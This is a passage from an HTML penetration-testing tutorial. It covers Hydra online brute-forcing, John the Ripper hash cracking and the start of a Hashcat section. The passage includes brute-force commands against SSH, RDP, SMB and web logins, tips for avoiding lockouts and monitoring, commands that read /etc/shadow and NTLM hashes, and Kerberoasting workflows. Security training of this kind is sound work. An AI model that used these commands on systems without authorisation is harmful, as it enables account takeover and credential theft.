# Generate password variations (John the Ripper rules):<br>
john --wordlist=words.txt --rules --stdout > expanded_wordlist.txt<br><br>

# Create targeted wordlist:<br>
# Company name variations, seasons+year, common patterns<br>
echo -e "Company123\nCompany2024\nWinter2024\nSummer2024\nPassword123" > custom.txt</div>

            <h5>Hydra GUI (hydra-gtk)</h5>
            <div class="code">
# Launch GUI version:<br>
hydra-gtk<br><br>

# GUI provides:<br>
# - Point-and-click interface<br>
# - Protocol selection dropdown<br>
# - Username/password file selection<br>
# - Visual progress monitoring<br>
# - Easy option configuration</div>
            <p><strong>When to Use GUI:</strong> Great for beginners learning Hydra syntax, quick one-off attacks, visual progress monitoring. CLI is better for scripting and advanced usage!</p>

            <div class="metaphor-box">
                <p><strong>🎯 Hydra Mastery Summary:</strong></p>
                <p><strong>Essential Commands by Protocol:</strong><br>
                • <strong>SSH:</strong> <code>hydra -L users.txt -P passwords.txt -u ssh://10.10.10.5</code><br>
                • <strong>FTP:</strong> <code>hydra -l admin -P rockyou.txt ftp://target.com</code><br>
                • <strong>HTTP POST:</strong> <code>hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"</code><br>
                • <strong>HTTP Basic Auth:</strong> <code>hydra -l admin -P passwords.txt http-get://target.com/admin</code><br>
                • <strong>SMB:</strong> <code>hydra -L users.txt -P passwords.txt smb://10.10.10.5</code><br>
                • <strong>RDP:</strong> <code>hydra -l administrator -P passwords.txt -t 2 rdp://10.10.10.5</code><br>
                • <strong>MySQL:</strong> <code>hydra -l root -P passwords.txt mysql://10.10.10.5</code><br>
                • <strong>SMTP:</strong> <code>hydra -l user@example.com -P passwords.txt smtp://mail.example.com</code><br><br>
                
                <strong>Critical Flags to Remember:</strong><br>
                • <code>-l</code> / <code>-L</code>: Single username / username list<br>
                • <code>-p</code> / <code>-P</code>: Single password / password list<br>
                • <code>-t</code>: Parallel connections (higher = faster, but noisier!)<br>
                • <code>-u</code>: Loop users first (PREVENTS account lockouts!)<br>
                • <code>-f</code>: Stop after first success<br>
                • <code>-v</code>: Verbose (monitor progress)<br>
                • <code>-e nsr</code>: Try null, same-as-username, reverse patterns<br>
                • <code>-o</code>: Output results to file<br>
                • <code>-S</code>: Use SSL/TLS<br>
                • <code>-R</code>: Resume interrupted session<br><br>
                
                <strong>Attack Strategies:</strong><br>
                1. <strong>Reconnaissance First:</strong> Enumerate valid usernames (enum4linux, OSINT) before attacking<br>
                2. <strong>Start Small:</strong> Test with top 100 passwords before using rockyou.txt (14M passwords!)<br>
                3. <strong>Avoid Lockouts:</strong> ALWAYS use <code>-u</code> flag and low <code>-t</code> values (2-4) for authentication services<br>
                4. <strong>Custom Wordlists:</strong> Create targeted lists (company name, seasons, years) for better success rates<br>
                5. <strong>Timing Matters:</strong> Attack during business hours (less suspicious) or after hours (less monitoring)<br>
                6. <strong>Save Progress:</strong> Hydra auto-saves, use <code>-R</code> to resume if interrupted<br><br>
                
                <strong>Real-World Workflow:</strong><br>
                1. <strong>Enumerate services:</strong> <code>nmap -sV -p- target.com</code> (find SSH/FTP/RDP/etc.)<br>
                2. <strong>Enumerate users:</strong> enum4linux, OSINT, email harvesting, SMB enumeration<br>
                3. <strong>Test default creds:</strong> admin:admin, root:root, admin:password<br>
                4. <strong>Try common patterns:</strong> <code>hydra -L users.txt -e nsr ssh://target</code><br>
                5. <strong>Targeted wordlist:</strong> Company name variations, seasons+year (CompanyName2024, Winter2024)<br>
                6. <strong>Escalate to rockyou:</strong> Only if targeted attacks fail<br>
                7. <strong>Monitor & adjust:</strong> Check for lockouts, adjust <code>-t</code> and <code>-w</code> values<br><br>
                
                <strong>Pro Tips:</strong><br>
                • FTP: Always try <code>anonymous:anonymous</code> first<br>
                • SSH: Use <code>-t 4 -u</code> (4 connections, loop users) to avoid triggering fail2ban<br>
                • RDP: EXTREME caution - use <code>-t 1 -u</code> (lockout policies are common!)<br>
                • HTTP forms: Capture POST request in Burp, copy params, replace values with ^USER^ ^PASS^<br>
                • SMB: Combine with CrackMapExec for better password spraying<br>
                • Databases: Common users: MySQL=root, PostgreSQL=postgres, MSSQL=sa<br><br>
                
                <strong>Legal & Ethical:</strong> ONLY use Hydra on systems you own or have explicit written permission to test. Unauthorized brute-forcing is illegal and can cause service disruptions (DoS), account lockouts, and generate massive logs. Always get permission FIRST! 🔐</p>
            </div>

            <h4>John the Ripper (THE CPU Password Cracking Tool)</h4>

            <p><strong>What is John the Ripper?</strong> John the Ripper (JtR) is a <strong>CPU-based password cracker</strong> that supports 400+ hash formats including MD5, SHA, NTLM, LM, bcrypt, Kerberos, WPA/WPA2, ZIP/RAR archives, PDF passwords, SSH keys, and more. It's been around since 1996 and is the gold standard for offline password cracking. Think of it as the "Swiss Army knife" of hash cracking!</p>
            <p><strong>Why John?</strong> It's fast, supports TONS of formats, has intelligent cracking modes (single, wordlist, incremental), can use custom rules to generate password variations, and has conversion tools (zip2john, ssh2john, etc.) to extract hashes from files!</p>

            <h5>Installation & Basic Usage</h5>
            <div class="code">
# John is pre-installed on Kali Linux<br>
john --help<br><br>

# Or install on other systems:<br>
sudo apt install john&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Debian/Ubuntu<br>
brew install john&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# macOS<br><br>

# Basic syntax:<br>
john [options] hashfile</div>

            <h5>Essential John Flags</h5>
            <div class="code">
# Cracking modes:<br>
--single&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Single crack mode (fast, uses username variations)<br>
--wordlist=FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Wordlist mode (dictionary attack)<br>
--incremental&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Incremental mode (brute-force)<br>
--external=MODE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# External mode (custom algorithms)<br>
--markov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Markov mode (statistical patterns)<br><br>

# Hash format:<br>
--format=FORMAT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Specify hash type (md5, sha256, ntlm, bcrypt, etc.)<br>
--list=formats&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show all supported formats (400+!)<br>
--list=format-details&nbsp;&nbsp;&nbsp;&nbsp;# Show detailed format info<br><br>

# Wordlist enhancements:<br>
--rules&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Apply transformation rules<br>
--rules=RULENAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Use specific rule set<br><br>

# Session management:<br>
--session=NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Name session (for saving progress)<br>
--restore=NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Restore saved session<br>
--status=NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show session status<br><br>

# Output options:<br>
--show&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show cracked passwords<br>
--pot=FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Custom potfile location (cracked passwords)<br>
--stdout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Output candidate passwords to stdout (for piping)<br><br>

# Performance:<br>
--fork=N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Parallel processing (N = number of cores)<br>
--node=MIN-MAX/TOTAL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Distributed cracking<br><br>

# Encoding:<br>
--encoding=TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Character encoding (utf-8, cp1252, etc.)</div>

            <p><strong>Flag Explanations:</strong></p>
            <ul>
                <li><strong>--format:</strong> CRITICAL! Specifies hash type. Wrong format = no results. Use <code>--list=formats</code> to see all 400+ supported types</li>
                <li><strong>--single:</strong> Fastest mode. Uses username to generate password guesses (john → john123, JOHN, john2024). Always try this first!</li>
                <li><strong>--wordlist:</strong> Dictionary attack. Uses password list (rockyou.txt, custom wordlists)</li>
                <li><strong>--incremental:</strong> Brute-force. Tries all combinations (a, aa, ab, ac...). SLOWEST but guaranteed to find password eventually</li>
                <li><strong>--rules:</strong> Applies transformations to wordlist (capitalize, add numbers, leet speak). Multiplies wordlist effectiveness!</li>
                <li><strong>--fork:</strong> Multi-core processing. Use <code>--fork=4</code> for 4 CPU cores (speeds up cracking significantly)</li>
                <li><strong>--show:</strong> Display already cracked passwords from potfile</li>
                <li><strong>--session:</strong> Save progress. If John is interrupted, you can resume with <code>--restore</code></li>
            </ul>

            <h5>Cracking Linux Passwords (Unshadow)</h5>
            <div class="code">
# Linux stores passwords in /etc/shadow (root only)<br>
# User info is in /etc/passwd<br>
# John needs BOTH files combined:<br><br>

# Combine passwd + shadow files:<br>
unshadow /etc/passwd /etc/shadow > hashes.txt<br><br>

# Crack with single mode (fast):<br>
john --single hashes.txt<br><br>

# Crack with wordlist:<br>
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt<br><br>

# Crack with rules (wordlist + transformations):<br>
john --wordlist=rockyou.txt --rules hashes.txt<br><br>

# Show cracked passwords:<br>
john --show hashes.txt<br><br>

# Incremental mode (brute-force):<br>
john --incremental hashes.txt</div>
            <p><strong>Real-World Use:</strong> During pentests, if you get root access, grab /etc/passwd and /etc/shadow, combine with unshadow, crack offline. Common in CTFs!</p>

            <h5>Cracking Windows Passwords (NTLM)</h5>
            <div class="code">
# Windows passwords stored as NTLM hashes<br>
# Extract with secretsdump.py (Impacket) or mimikatz<br><br>

# NTLM hash format: username:RID:LM:NTLM:::<br>
# Example: Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::<br><br>

# Crack NTLM hashes:<br>
john --format=nt ntlm_hashes.txt<br><br>

# With wordlist + rules:<br>
john --format=nt --wordlist=rockyou.txt --rules ntlm_hashes.txt<br><br>

# Show cracked:<br>
john --format=nt --show ntlm_hashes.txt<br><br>

# LM hashes (older Windows, very weak):<br>
john --format=lm lm_hashes.txt</div>
            <p><strong>NTLM vs LM:</strong> LM hashes are VERY weak (max 14 chars, uppercase only, split into 7-char chunks). NTLM is stronger but still vulnerable to brute-force and rainbow tables. Always crack LM first (seconds), then NTLM!</p>

            <h5>List All Supported Formats</h5>
            <div class="code">
# Show ALL formats (400+):<br>
john --list=formats<br><br>

# Common formats:<br>
md5crypt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Linux /etc/shadow MD5<br>
sha512crypt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Linux /etc/shadow SHA-512<br>
bcrypt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Linux /etc/shadow bcrypt<br>
nt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Windows NTLM<br>
lm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Windows LM (old)<br>
mscash2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Windows cached credentials<br>
krb5tgs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Kerberos TGS (Kerberoasting)<br>
krb5asrep&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Kerberos AS-REP<br>
raw-md5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Raw MD5 hash<br>
raw-sha1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Raw SHA1<br>
raw-sha256&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Raw SHA-256<br>
zip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ZIP file passwords<br>
rar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# RAR archive passwords<br>
office&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MS Office documents<br>
pdf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# PDF passwords<br>
ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SSH private keys<br>
mysql-sha1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MySQL passwords<br>
postgres&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# PostgreSQL passwords<br>
mssql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MSSQL passwords<br><br>

# Search for specific format:<br>
john --list=formats | grep -i ntlm<br>
john --list=formats | grep -i kerberos</div>

            <h5>Converting File Formats (xxx2john)</h5>
            <div class="code">
# John includes conversion tools to extract hashes from files:<br><br>

# ZIP file passwords:<br>
zip2john encrypted.zip > zip_hash.txt<br>
john --wordlist=rockyou.txt zip_hash.txt<br><br>

# RAR archive passwords:<br>
rar2john encrypted.rar > rar_hash.txt<br>
john rar_hash.txt<br><br>

# SSH private key passphrases:<br>
ssh2john id_rsa > ssh_hash.txt<br>
john --wordlist=rockyou.txt ssh_hash.txt<br><br>

# PDF passwords:<br>
pdf2john encrypted.pdf > pdf_hash.txt<br>
john pdf_hash.txt<br><br>

# MS Office documents (Word, Excel, PowerPoint):<br>
office2john document.docx > office_hash.txt<br>
john office_hash.txt<br><br>

# 7-Zip archives:<br>
7z2john encrypted.7z > 7z_hash.txt<br>
john 7z_hash.txt<br><br>

# Encrypted Keepass databases:<br>
keepass2john database.kdbx > keepass_hash.txt<br>
john keepass_hash.txt<br><br>

# TrueCrypt/VeraCrypt volumes:<br>
truecrypt2john encrypted_volume > tc_hash.txt<br>
john tc_hash.txt<br><br>

# BitLocker encrypted drives:<br>
bitlocker2john /dev/sdb1 > bitlocker_hash.txt<br>
john bitlocker_hash.txt<br><br>

# Mozilla Firefox/Thunderbird master passwords:<br>
mozilla2john signons.sqlite > mozilla_hash.txt<br>
john mozilla_hash.txt<br><br>

# WPA/WPA2 WiFi handshakes:<br>
# First capture handshake with aircrack-ng<br>
wpa2john capture.pcap > wpa_hash.txt<br>
john --wordlist=rockyou.txt wpa_hash.txt</div>
            <p><strong>How it Works:</strong> xxx2john tools extract password hashes from encrypted files and convert them into John's format. Then John cracks the hash just like any other password!</p>

            <h5>Cracking Kerberos Tickets (Kerberoasting)</h5>
            <div class="code">
# Kerberoasting attack (Active Directory):<br>
# 1. Request Kerberos service tickets (with GetUserSPNs.py)<br>
# 2. Extract and crack tickets offline<br><br>

# Kerberos TGS tickets (Kerberoasting):<br>
john --format=krb5tgs --wordlist=rockyou.txt kerberos_tickets.txt<br><br>

# Kerberos AS-REP (AS-REP Roasting):<br>
john --format=krb5asrep --wordlist=rockyou.txt asrep_hashes.txt<br><br>

# With rules for faster cracking:<br>
john --format=krb5tgs --wordlist=rockyou.txt --rules kerberos_tickets.txt</div>
            <p><strong>Real-World Use:</strong> After Kerberoasting (GetUserSPNs.py), you get encrypted service tickets. Crack offline with John, then use credentials to access services or escalate privileges!</p>

            <h5>Rule-Based Attacks</h5>
            <div class="code">
# Rules transform wordlist passwords (multiply effectiveness)<br>
# Example: "password" becomes: Password, password123, p@ssword, PASSWORD, etc.<br><br>

# Use default rules:<br>
john --wordlist=rockyou.txt --rules hashes.txt<br><br>

# Use specific rule set:<br>
john --wordlist=rockyou.txt --rules=Jumbo hashes.txt<br><br>

# List available rules:<br>
john --list=rules<br><br>

# Common rule sets:<br>
--rules=Single&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Single mode rules (username variations)<br>
--rules=Wordlist&nbsp;&nbsp;&nbsp;&nbsp;# Basic wordlist transformations<br>
--rules=Jumbo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Comprehensive ruleset (JtR Jumbo)<br>
--rules=KoreLogic&nbsp;&nbsp;# KoreLogic rules (very powerful)<br><br>

# Custom rules (in john.conf):<br>
# Rules syntax examples:<br>
# c = Capitalize first letter (password → Password)<br>
# u = Uppercase all (password → PASSWORD)<br>
# l = Lowercase all (PASSWORD → password)<br>
# $1 = Append "1" (password → password1)<br>
# ^1 = Prepend "1" (password → 1password)<br>
# sa@ = Replace "a" with "@" (password → p@ssword)<br>
# [...]<br><br>

# Generate candidates to stdout (preview rules):<br>
john --wordlist=words.txt --rules --stdout | head -20</div>
            <p><strong>Rule Power:</strong> Rules dramatically increase wordlist effectiveness. A 1000-word list with rules becomes 100,000+ candidates! Essential for cracking complex passwords!</p>

            <h5>Incremental Mode (Brute-Force)</h5>
            <div class="code">
# Incremental mode = pure brute-force<br>
# Tries all character combinations in order<br><br>

# Default incremental (lowercase + digits):<br>
john --incremental hashes.txt<br><br>

# All printable ASCII characters:<br>
john --incremental=ASCII hashes.txt<br><br>

# Alphanumeric only:<br>
john --incremental=Alnum hashes.txt<br><br>

# Digits only (PIN codes):<br>
john --incremental=Digits hashes.txt<br><br>

# Custom character set (in john.conf):<br>
john --incremental=Custom hashes.txt<br><br>

# Limit length (faster):<br>
# Edit john.conf: MinLen = 1, MaxLen = 8<br>
john --incremental hashes.txt</div>
            <p><strong>Performance Warning:</strong> Incremental mode is SLOW for long passwords! 8 chars = hours, 10 chars = days/weeks, 12+ chars = months/years. Only use for short passwords or as last resort!</p>

            <h5>Session Management</h5>
            <div class="code">
# Save progress automatically:<br>
john --session=mysession --wordlist=rockyou.txt hashes.txt<br><br>

# Interrupt with Ctrl+C (John saves progress)<br><br>

# Restore saved session:<br>
john --restore=mysession<br><br>

# Check session status:<br>
john --status=mysession<br><br>

# Default session name is "john" if not specified<br>
john --restore&nbsp;&nbsp;# Restores default session</div>
            <p><strong>Why Sessions?</strong> Cracking can take hours/days. Sessions let you pause, resume, check progress without losing work!</p>

            <h5>Parallel Processing</h5>
            <div class="code">
# Use multiple CPU cores:<br>
john --fork=4 --wordlist=rockyou.txt hashes.txt<br>
# --fork=4 uses 4 cores<br><br>

# Check number of cores:<br>
nproc&nbsp;&nbsp;# Linux<br>
sysctl -n hw.ncpu&nbsp;&nbsp;# macOS<br><br>

# Distributed cracking (multiple machines):<br>
# Machine 1 (1st quarter):<br>
john --node=1-4/16 --wordlist=rockyou.txt hashes.txt<br><br>

# Machine 2 (2nd quarter):<br>
john --node=5-8/16 --wordlist=rockyou.txt hashes.txt<br><br>

# Machine 3 (3rd quarter):<br>
john --node=9-12/16 --wordlist=rockyou.txt hashes.txt<br><br>

# Machine 4 (4th quarter):<br>
john --node=13-16/16 --wordlist=rockyou.txt hashes.txt</div>
            <p><strong>Distributed Cracking:</strong> Split work across multiple machines for MASSIVE speedup! Each machine cracks different portion of keyspace!</p>

            <h5>Show Cracked Passwords</h5>
            <div class="code">
# Show cracked passwords:<br>
john --show hashes.txt<br><br>

# Show with specific format:<br>
john --format=nt --show ntlm_hashes.txt<br><br>

# Show only usernames:<br>
john --show --users=0 hashes.txt<br><br>

# Show with left uncracked:<br>
john --show=left hashes.txt<br><br>

# Potfile location (cracked passwords stored here):<br>
~/.john/john.pot&nbsp;&nbsp;# Linux/Mac<br>
%USERPROFILE%\.john\john.pot&nbsp;&nbsp;# Windows</div>

            <div class="metaphor-box">
                <p><strong>🎯 John the Ripper Mastery Summary:</strong></p>
                <p><strong>Essential Commands:</strong><br>
                • <strong>Linux passwords:</strong> <code>unshadow /etc/passwd /etc/shadow > hashes.txt</code> → <code>john --wordlist=rockyou.txt --rules hashes.txt</code><br>
                • <strong>Windows NTLM:</strong> <code>john --format=nt --wordlist=rockyou.txt ntlm.txt</code><br>
                • <strong>ZIP files:</strong> <code>zip2john file.zip > hash.txt</code> → <code>john hash.txt</code><br>
                • <strong>SSH keys:</strong> <code>ssh2john id_rsa > hash.txt</code> → <code>john --wordlist=rockyou.txt hash.txt</code><br>
                • <strong>Kerberoasting:</strong> <code>john --format=krb5tgs --wordlist=rockyou.txt tickets.txt</code><br>
                • <strong>Show cracked:</strong> <code>john --show hashes.txt</code><br><br>
                
                <strong>Cracking Strategy (Try in Order):</strong><br>
                1. <strong>Single mode:</strong> <code>john --single hashes.txt</code> (fastest, uses usernames)<br>
                2. <strong>Wordlist:</strong> <code>john --wordlist=rockyou.txt hashes.txt</code><br>
                3. <strong>Wordlist + Rules:</strong> <code>john --wordlist=rockyou.txt --rules hashes.txt</code> (10-100x more candidates)<br>
                4. <strong>Incremental (brute-force):</strong> <code>john --incremental hashes.txt</code> (last resort, SLOW!)<br><br>
                
                <strong>Critical Flags:</strong><br>
                • <code>--format=FORMAT</code>: Specify hash type (nt, md5crypt, bcrypt, krb5tgs, etc.)<br>
                • <code>--wordlist=FILE</code>: Dictionary attack with password list<br>
                • <code>--rules</code>: Apply transformation rules (HUGE performance boost!)<br>
                • <code>--fork=N</code>: Use N CPU cores (4-8 cores = 4-8x faster)<br>
                • <code>--session=NAME</code>: Save progress, resume with <code>--restore=NAME</code><br>
                • <code>--show</code>: Display cracked passwords<br><br>
                
                <strong>Real-World Workflows:</strong><br>
                • <strong>Linux compromise:</strong> Dump /etc/passwd + /etc/shadow → unshadow → crack with John → su to cracked users<br>
                • <strong>Windows compromise:</strong> secretsdump.py → Extract NTLM → John cracking → Pass-the-Hash or legitimate login<br>
                • <strong>Encrypted files:</strong> Find .zip/.rar/.7z → xxx2john → Crack → Extract sensitive data<br>
                • <strong>SSH pivoting:</strong> Find id_rsa keys → ssh2john → Crack passphrase → SSH to other systems<br>
                • <strong>Kerberoasting:</strong> GetUserSPNs.py → Dump tickets → John cracking → Service account compromise<br><br>
                
                <strong>Performance Tips:</strong><br>
                • Always try <code>--single</code> first (seconds-minutes)<br>
                • Use <code>--rules</code> with wordlists (10-100x more effective)<br>
                • Use <code>--fork=N</code> for multi-core (linear speedup)<br>
                • Start with small wordlists (top 1000), escalate to rockyou.txt<br>
                • Save sessions (<code>--session</code>) for long cracks<br>
                • Incremental mode = LAST RESORT (days/weeks for 10+ char passwords)<br><br>
                
                <strong>Common Hash Formats:</strong><br>
                Linux: md5crypt, sha512crypt, bcrypt | Windows: nt, lm, mscash2 | Kerberos: krb5tgs, krb5asrep | Raw: raw-md5, raw-sha1, raw-sha256 | Files: zip, rar, office, pdf, ssh 🔐</p>
            </div>

            <h4>Hashcat (THE GPU Password Cracking Tool)</h4>

            <p><strong>What is Hashcat?</strong> Hashcat is the world's <strong>fastest password cracker</strong> using GPU acceleration. It can leverage your graphics card (NVIDIA, AMD, Intel) to crack passwords 100-1000x faster than CPU-based tools! Supports 400+ hash algorithms including MD5, SHA, NTLM, bcrypt, WPA/WPA2, Kerberos, database hashes, and more. If John the Ripper is a bicycle, Hashcat is a Ferrari! 🏎️</p>
            <p><strong>Why Hashcat?</strong> GPU parallelism = MASSIVE speed. A single high-end GPU can try billions of passwords per second for fast hashes (MD5, NTLM). Essential for cracking large password dumps, WPA handshakes, and modern hashes!</p>

            <h5>Installation & GPU Setup</h5>
            <div class="code">
# Hashcat is pre-installed on Kali Linux<br>
hashcat --help<br><br>

# Or install on other systems:<br>
sudo apt install hashcat&nbsp;&nbsp;&nbsp;&nbsp;# Debian/Ubuntu<br>
brew install hashcat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# macOS<br><br>

# Check GPU availability:<br>
hashcat -I<br>
# Shows: NVIDIA, AMD, or Intel GPUs<br><br>

# Benchmark your GPU:<br>
hashcat -b<br>
# Shows hash/s for each algorithm</div>
            <p><strong>GPU Requirements:</strong> NVIDIA (CUDA), AMD (OpenCL), or Intel (OpenCL). Modern GPUs = faster. RTX 3090 can do 100+ GH/s for NTLM!</p>

            <h5>Hash Modes (-m flag)</h5>
            <div class="code">
# Hashcat uses -m flag to specify hash type<br>
# There are 400+ hash modes!<br><br>

# Common hash modes:<br>
-m 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MD5<br>
-m 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SHA1<br>
-m 1000&nbsp;&nbsp;&nbsp;&nbsp;# NTLM (Windows passwords)<br>
-m 1800&nbsp;&nbsp;&nbsp;&nbsp;# Linux SHA-512 (/etc/shadow)<br>
-m 3000&nbsp;&nbsp;&nbsp;&nbsp;# LM (old Windows)<br>
-m 3200&nbsp;&nbsp;&nbsp;&nbsp;# bcrypt (Linux /etc/shadow)<br>
-m 5600&nbsp;&nbsp;&nbsp;&nbsp;# NetNTLMv2<br>
-m 13100&nbsp;&nbsp;&nbsp;# Kerberos TGS (Kerberoasting)<br>
-m 18200&nbsp;&nbsp;&nbsp;# Kerberos AS-REP<br>
-m 22000&nbsp;&nbsp;&nbsp;# WPA/WPA2 PMKID<br>
-m 2500&nbsp;&nbsp;&nbsp;&nbsp;# WPA/WPA2 (old format)<br>
-m 11600&nbsp;&nbsp;&nbsp;# 7-Zip<br>
-m 13600&nbsp;&nbsp;&nbsp;# WinZip<br>
-m 10400&nbsp;&nbsp;&nbsp;# PDF 1.1-1.3<br>
-m 10500&nbsp;&nbsp;&nbsp;# PDF 1.4-1.6<br>
-m 9400&nbsp;&nbsp;&nbsp;&nbsp;# MS Office 2007<br>
-m 9500&nbsp;&nbsp;&nbsp;&nbsp;# MS Office 2010<br>
-m 9600&nbsp;&nbsp;&nbsp;&nbsp;# MS Office 2013<br>
-m 200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MySQL 4.1/5.x<br>
-m 12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# PostgreSQL<br>
-m 131&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MSSQL (2000)<br>
-m 132&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MSSQL (2005/2008/2012/2014/2016)<br><br>

# List all hash modes:<br>
hashcat --help | grep -i "Hash modes"<br><br>

# Example hash format detection:<br>
hashcat --identify hash.txt&nbsp;&nbsp;# Auto-detect hash type (if possible)</div>

            <h5>Attack Modes (-a flag)</h5>
            <div class="code">
# Attack modes define how passwords are generated:<br><br>

-a 0&nbsp;&nbsp;# Straight (wordlist attack)<br>
-a 1&nbsp;&nbsp;# Combination (combine two wordlists)<br>
-a 3&nbsp;&nbsp;# Brute-force (mask attack)<br>
-a 6&nbsp;&nbsp;# Hybrid Wordlist + Mask<br>
-a 7&nbsp;&nbsp;# Hybrid Mask + Wordlist</div>
            <p><strong>Attack Mode Explanations:</strong></p>
            <ul>
                <li><strong>-a 0 (Straight):</strong> Use wordlist as-is (with optional rules). Most common!</li>
                <li><strong>-a 1 (Combination):</strong> Combine words from two lists (word1+word2). Example: "dragon" + "ball" = "dragonball"</li>
                <li><strong>-a 3 (Brute-force/Mask):</strong> Try all combinations matching pattern (?l=lowercase, ?u=uppercase, ?d=digit, ?s=special)</li>
                <li><strong>-a 6 (Hybrid):</strong> Wordlist + mask. Example: wordlist "password" + mask "?d?d" = password00, password01, ..., password99</li>
                <li><strong>-a 7 (Hybrid):</strong> Mask + wordlist. Example: mask "?d?d" + wordlist "password" = 00password, 01password, etc.</li>
            </ul>

            <h5>Straight Attack (Wordlist)</h5>
            <div class="code">
